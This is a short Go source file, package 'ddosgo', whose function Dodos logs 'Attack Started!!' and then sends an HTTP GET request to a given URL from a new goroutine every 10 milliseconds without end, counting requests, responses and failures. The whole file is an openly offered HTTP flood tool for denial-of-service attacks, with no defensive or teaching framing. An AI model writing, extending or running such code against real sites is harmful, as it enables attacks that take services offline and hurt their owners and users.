package ddosgo

import (
  "net/http"
  "log"
  "time"
)
var Totalrequest int
var Totalresponse int
var Totalbounced int
var URL string

func Dodos(url string)  {
  Tr := &Totalrequest
  Tres := &Totalresponse
  Tb := &Totalbounced
  Ur := &URL
  *Ur = url
  log.Print("Attack Started!!")
  for {
    go func ()  {
      _, err := http.Get(url)
      *Tr = *Tr + 1
      if err != nil {
        *Tb = *Tb + 1
      }else{
        *Tres = *Tres + 1
      }
    }()
    time.Sleep(10*time.Millisecond)
  }
}
